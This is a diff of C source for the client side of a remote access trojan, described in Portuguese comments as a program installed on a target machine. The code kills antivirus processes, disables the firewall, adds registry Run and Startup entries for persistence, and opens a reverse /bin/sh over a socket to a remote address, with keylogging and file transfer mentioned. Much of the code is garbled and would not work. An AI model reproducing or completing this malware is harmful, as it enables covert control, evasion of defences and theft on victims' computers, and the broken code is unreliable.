@@ -17,6 +17,28 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 */
 
+/*
+Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.
+
+Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.
+
+JÁ PRONTOS: desativar anti-virus e firewallro
+            copiar-se para o registro
+            copiar-se para o menu iniciar
+
+terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
+
+// use without abuse.
+
+// POC!
+
+// coder  mrx6s0
+
+DESSE MODO O CÓDIGO PASSA A SER COMPILADO PARA ASSEMBLY. 
+SALVAR! ############# PRESTAR ATENÇÃO AQUI!!! ##########
+
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -46,13 +68,13 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   char REMOTE_ADDR; /*remote_addr */
   int REMOTE_PORT; /* remote port */
   char commands[bytes];
-  int x;
   int novax;
+  int x;
   FILE *filecmd;
 
-  } Target;
+ // x = true; 
 
-  x = true;
+  } Target;
 
 
   void
@@ -70,7 +92,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   kill_antivirus()
 
   {
-     //int i;
+     int x;
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
@@ -79,7 +101,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     else if(( dup2(x,0)),dup2(x,1));
        execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
        send(x,"Killing anti virus...\n",31,0);
-       execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);
+       execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);
 
        return;
 
@@ -92,7 +114,8 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   kill_firewall()
 
   {
-
+	  
+   int x;
    dup2(x,0);
    execve("firewall.vbs", 0, 0);
 
@@ -106,7 +129,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   auto_copy()
 
   {
-
+     int x;
      dup2(x, 0);
 
      execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wopnt.exe",0,0);
@@ -118,12 +141,12 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   copy_to_registry()
 
   {
-
+    int x;
     dup2(x, 0);
     dup2(x,1);
 
-    execve("copy /Y wopnt.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
-    execve("cp con.py /usr",NULL,NULL); /* for  linux systems, probably will failed... */
+    execve("copy /Y whopnt.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
+    execve("cp whopnt.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */
 
     return;
 
@@ -133,7 +156,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     {
 
-    XFreeCursor; //magic happens here
+    XFreeCursor; 
 
     pid_t pid;
 
@@ -162,9 +185,8 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
         /* hidden in all the ways */
 
         sigmask(0x01);
-        umask("7x324x12");
+        //umask("7x324x12");
         chdir("/, C:\\, C:\\Windows\\System32,F:\\,G:\\,D:\\,E:\\,H:\\");
-        sigsetmask(0);
 
         }
 
@@ -206,7 +228,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                    discomment this if u think necessary... */
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
-     if (connect == -1)
+     if (connect == 0x0)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
@@ -268,7 +290,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
 
-    XFreeCursor; //magic happens here
+    //XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -295,7 +317,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
             exit(EXIT_SUCCESS);
 
         sigmask(0);
-        sigsetmask(23212);
+       // sigsetmask(23212);
         chdir("/, C:\\, C:\\Windows\\System32");
 
         int k;
@@ -314,14 +336,13 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
      malloc(sizeof (x));
-
      x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
 
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                    discomment this if u think necessary... */
 
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
-     if (connect == -1)
+     if (connect == 0x00)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
@@ -335,7 +356,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      /*handle with the impossible errors. */
 
-     if(connect == -1)
+     if(connect == 0x0)
      perror("BREAK CONNECTION,(failure)");
 
      else
@@ -348,7 +369,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      return;
 
-     free(x); /* freedom for x! */
+     //free(x); /* freedom for x! */
 
      }
 
